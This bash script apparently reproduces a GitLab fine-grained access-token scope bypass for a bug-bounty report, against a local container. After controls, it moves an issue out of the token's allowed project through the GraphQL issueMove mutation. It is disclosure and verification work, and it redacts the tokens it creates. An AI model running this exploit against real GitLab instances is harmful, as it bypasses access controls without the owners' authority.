#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8080}"
CONTAINER="${CONTAINER:-gitlab}"
OUT="${OUT:-artifacts}"
mkdir -p "$OUT"

log() { printf '\n===== %s =====\n' "$*"; }

api_json() {
  local token="$1" method="$2" path="$3"; shift 3
  curl --silent --show-error --fail-with-body \
    --request "$method" \
    --header "PRIVATE-TOKEN: $token" \
    "$@" "$BASE/api/v4$path"
}

graphql() {
  local token="$1" source="$2" iid="$3" target="$4"
  local q
  q="mutation { issueMove(input: { projectPath: \"$source\", iid: \"$iid\", targetProjectPath: \"$target\" }) { errors } }"
  jq -cn --arg q "$q" '{query:$q}' | \
    curl --silent --show-error --fail-with-body \
      --request POST \
      --header "PRIVATE-TOKEN: $token" \
      --header 'Content-Type: application/json' \
      --data-binary @- "$BASE/api/graphql"
}

log "Bootstrap root API token"
docker cp security/gitlab-granular-pat/bootstrap.rb "$CONTAINER:/tmp/h1-bootstrap.rb"
BOOT="$(docker exec "$CONTAINER" gitlab-rails runner /tmp/h1-bootstrap.rb)"
printf '%s\n' "$BOOT" | tee "$OUT/bootstrap.txt"
ROOT_TOKEN="$(printf '%s\n' "$BOOT" | sed -n 's/^H1_ROOT_TOKEN=//p' | tail -1)"
test -n "$ROOT_TOKEN"

STAMP="$(date +%s)"
USER_NAME="h1pat$STAMP"
USER_EMAIL="$USER_NAME@example.test"
PASSWORD="H1-test-Only-$STAMP-Aa1!"

log "Create isolated GitLab user"
USER_JSON="$(api_json "$ROOT_TOKEN" POST /users \
  --data-urlencode "username=$USER_NAME" \
  --data-urlencode "name=H1 PAT Boundary Test" \
  --data-urlencode "email=$USER_EMAIL" \
  --data-urlencode "password=$PASSWORD" \
  --data-urlencode "skip_confirmation=true")"
printf '%s\n' "$USER_JSON" | tee "$OUT/user.json"
USER_ID="$(jq -r '.id' <<<"$USER_JSON")"
test "$USER_ID" != "null"

log "Create source and target groups"
SRC_GROUP_JSON="$(api_json "$ROOT_TOKEN" POST /groups \
  --data-urlencode "name=h1-source-$STAMP" --data-urlencode "path=h1-source-$STAMP")"
DST_GROUP_JSON="$(api_json "$ROOT_TOKEN" POST /groups \
  --data-urlencode "name=h1-target-$STAMP" --data-urlencode "path=h1-target-$STAMP")"
printf '%s\n' "$SRC_GROUP_JSON" >"$OUT/source-group.json"
printf '%s\n' "$DST_GROUP_JSON" >"$OUT/target-group.json"
SRC_GROUP_ID="$(jq -r '.id' <<<"$SRC_GROUP_JSON")"
DST_GROUP_ID="$(jq -r '.id' <<<"$DST_GROUP_JSON")"
SRC_GROUP_PATH="$(jq -r '.full_path' <<<"$SRC_GROUP_JSON")"
DST_GROUP_PATH="$(jq -r '.full_path' <<<"$DST_GROUP_JSON")"

log "Create source and target projects"
SRC_PROJECT_JSON="$(api_json "$ROOT_TOKEN" POST /projects \
  --data-urlencode "name=source" --data-urlencode "path=source" \
  --data-urlencode "namespace_id=$SRC_GROUP_ID")"
DST_PROJECT_JSON="$(api_json "$ROOT_TOKEN" POST /projects \
  --data-urlencode "name=target" --data-urlencode "path=target" \
  --data-urlencode "namespace_id=$DST_GROUP_ID")"
printf '%s\n' "$SRC_PROJECT_JSON" >"$OUT/source-project.json"
printf '%s\n' "$DST_PROJECT_JSON" >"$OUT/target-project.json"
SRC_PROJECT_ID="$(jq -r '.id' <<<"$SRC_PROJECT_JSON")"
DST_PROJECT_ID="$(jq -r '.id' <<<"$DST_PROJECT_JSON")"
SRC_PATH="$(jq -r '.path_with_namespace' <<<"$SRC_PROJECT_JSON")"
DST_PATH="$(jq -r '.path_with_namespace' <<<"$DST_PROJECT_JSON")"

log "Give the same user Developer rights in A and B"
api_json "$ROOT_TOKEN" POST "/groups/$SRC_GROUP_ID/members" \
  --data-urlencode "user_id=$USER_ID" --data-urlencode "access_level=30" >"$OUT/source-membership.json"
api_json "$ROOT_TOKEN" POST "/groups/$DST_GROUP_ID/members" \
  --data-urlencode "user_id=$USER_ID" --data-urlencode "access_level=30" >"$OUT/target-membership.json"

log "Create ordinary legacy API PAT for ambient-permission control"
LEGACY_JSON="$(api_json "$ROOT_TOKEN" POST "/users/$USER_ID/personal_access_tokens" \
  --data-urlencode "name=h1-legacy-control" \
  --data-urlencode "scopes[]=api" \
  --data-urlencode "expires_at=$(date -u -d '+1 day' +%F)")"
printf '%s\n' "$LEGACY_JSON" >"$OUT/legacy-token.json"
LEGACY_TOKEN="$(jq -r '.token' <<<"$LEGACY_JSON")"
test "$LEGACY_TOKEN" != "null"

log "Create three owned test issues"
EXP_JSON="$(api_json "$LEGACY_TOKEN" POST "/projects/$SRC_PROJECT_ID/issues" \
  --data-urlencode "title=H1 GPAT escape source $STAMP")"
LEGACY_CTL_JSON="$(api_json "$LEGACY_TOKEN" POST "/projects/$DST_PROJECT_ID/issues" \
  --data-urlencode "title=H1 legacy B-to-A control $STAMP")"
GPAT_CTL_JSON="$(api_json "$LEGACY_TOKEN" POST "/projects/$DST_PROJECT_ID/issues" \
  --data-urlencode "title=H1 GPAT B-to-A denial control $STAMP")"
printf '%s\n' "$EXP_JSON" >"$OUT/exploit-source-issue.json"
printf '%s\n' "$LEGACY_CTL_JSON" >"$OUT/legacy-control-issue.json"
printf '%s\n' "$GPAT_CTL_JSON" >"$OUT/gpat-control-issue.json"
EXP_IID="$(jq -r '.iid' <<<"$EXP_JSON")"
LEGACY_CTL_IID="$(jq -r '.iid' <<<"$LEGACY_CTL_JSON")"
GPAT_CTL_IID="$(jq -r '.iid' <<<"$GPAT_CTL_JSON")"

log "Create A-only fine-grained PAT with move_issue permission"
docker cp security/gitlab-granular-pat/create_gpat.rb "$CONTAINER:/tmp/h1-create-gpat.rb"
GPAT_SETUP="$(docker exec \
  -e H1_USER_ID="$USER_ID" \
  -e H1_SOURCE_PROJECT_ID="$SRC_PROJECT_ID" \
  -e H1_TARGET_PROJECT_ID="$DST_PROJECT_ID" \
  "$CONTAINER" gitlab-rails runner /tmp/h1-create-gpat.rb)"
printf '%s\n' "$GPAT_SETUP" | tee "$OUT/gpat-scope.txt"
GPAT="$(printf '%s\n' "$GPAT_SETUP" | sed -n 's/^H1_GPAT=//p' | tail -1)"
test -n "$GPAT"

# Do not persist actual tokens in uploaded evidence.
sed -i -E 's/(H1_ROOT_TOKEN=).*/\1[REDACTED]/; s/(H1_GPAT=).*/\1[REDACTED]/' "$OUT/bootstrap.txt" "$OUT/gpat-scope.txt" || true
jq 'del(.token)' "$OUT/legacy-token.json" >"$OUT/legacy-token.redacted.json"
mv "$OUT/legacy-token.redacted.json" "$OUT/legacy-token.json"

log "CONTROL 1: legacy PAT proves user can move B -> A"
LEGACY_CONTROL="$(graphql "$LEGACY_TOKEN" "$DST_PATH" "$LEGACY_CTL_IID" "$SRC_PATH")"
printf '%s\n' "$LEGACY_CONTROL" | tee "$OUT/control-legacy-b-to-a.json"
if jq -e '.errors != null or (.data.issueMove.errors | length > 0)' <<<"$LEGACY_CONTROL" >/dev/null; then
  echo "FAIL: legacy control could not move B -> A"
  exit 20
fi

log "CONTROL 2: A-only GPAT must reject source B -> A"
GPAT_CONTROL="$(graphql "$GPAT" "$DST_PATH" "$GPAT_CTL_IID" "$SRC_PATH")"
printf '%s\n' "$GPAT_CONTROL" | tee "$OUT/control-gpat-b-to-a.json"
if ! jq -e '.errors != null' <<<"$GPAT_CONTROL" >/dev/null; then
  echo "FAIL: A-only GPAT unexpectedly authorized B as a source; test isolation invalid"
  exit 21
fi

log "EXPLOIT TEST: same A-only GPAT attempts A -> B"
EXPLOIT="$(graphql "$GPAT" "$SRC_PATH" "$EXP_IID" "$DST_PATH")"
printf '%s\n' "$EXPLOIT" | tee "$OUT/exploit-gpat-a-to-b.json"

log "Verify before/after state"
SRC_AFTER="$(api_json "$LEGACY_TOKEN" GET "/projects/$SRC_PROJECT_ID/issues/$EXP_IID")"
DST_SEARCH="$(api_json "$LEGACY_TOKEN" GET "/projects/$DST_PROJECT_ID/issues?search=H1%20GPAT%20escape%20source%20$STAMP&scope=all")"
GPAT_CTL_AFTER="$(api_json "$LEGACY_TOKEN" GET "/projects/$DST_PROJECT_ID/issues/$GPAT_CTL_IID")"
printf '%s\n' "$SRC_AFTER" >"$OUT/source-after.json"
printf '%s\n' "$DST_SEARCH" >"$OUT/target-after-search.json"
printf '%s\n' "$GPAT_CTL_AFTER" >"$OUT/gpat-control-after.json"

EXPLOIT_GRAPHQL_OK=false
if jq -e '.errors == null and (.data.issueMove.errors | length == 0)' <<<"$EXPLOIT" >/dev/null; then
  EXPLOIT_GRAPHQL_OK=true
fi
TARGET_CREATED="$(jq 'length' <<<"$DST_SEARCH")"
SOURCE_STATE="$(jq -r '.state' <<<"$SRC_AFTER")"
CONTROL_STATE="$(jq -r '.state' <<<"$GPAT_CTL_AFTER")"

{
  echo "GitLab image: ${GITLAB_IMAGE:-gitlab/gitlab-ee:19.4.1-ee.0}"
  echo "Source project: $SRC_PATH ($SRC_PROJECT_ID)"
  echo "Target project: $DST_PATH ($DST_PROJECT_ID)"
  echo "Legacy B->A control: PASS"
  echo "A-only GPAT B->A denial control: PASS"
  echo "A-only GPAT A->B GraphQL success: $EXPLOIT_GRAPHQL_OK"
  echo "A->B target matching issue count: $TARGET_CREATED"
  echo "A source issue state after request: $SOURCE_STATE"
  echo "B denial-control issue state: $CONTROL_STATE"
} | tee "$OUT/summary.txt"

if [[ "$EXPLOIT_GRAPHQL_OK" == true && "$TARGET_CREATED" -ge 1 && "$SOURCE_STATE" == "closed" && "$CONTROL_STATE" == "opened" ]]; then
  echo "H1_RESULT=PASS boundary escape reproduced"
  echo "H1_RESULT=PASS boundary escape reproduced" >>"$OUT/summary.txt"
  exit 0
fi

echo "H1_RESULT=NOT_REPRODUCED"
echo "H1_RESULT=NOT_REPRODUCED" >>"$OUT/summary.txt"
exit 22
